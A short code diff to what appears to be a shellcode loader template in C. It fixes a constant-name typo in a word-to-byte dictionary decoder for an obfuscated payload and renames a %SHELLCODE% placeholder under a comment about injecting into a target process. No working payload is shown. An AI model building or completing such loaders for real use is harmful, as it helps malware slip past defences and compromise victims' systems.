@@ -60,7 +60,7 @@ void DICT_decrypt(const char* dict_payload) {
 
         // Look up the word in the association table
         decoded_byte = 0xFF;  // Default value if the word is not found
-        for (int k = 0; k < ASSOCATION_TABLE_SIZE; k++) {
+        for (int k = 0; k < ASSOCIATION_TABLE_SIZE; k++) {
             if (strcmp(word, association_table[k].word) == 0) {
                 decoded_byte = association_table[k].byte;  // Get the associated byte
                 break;
@@ -88,4 +88,4 @@ void DICT_decrypt(const char* dict_payload) {
 // }
 
 // Payload to be injected into the target process
-%SHELLCODE%
+%__SHELLCODE__%
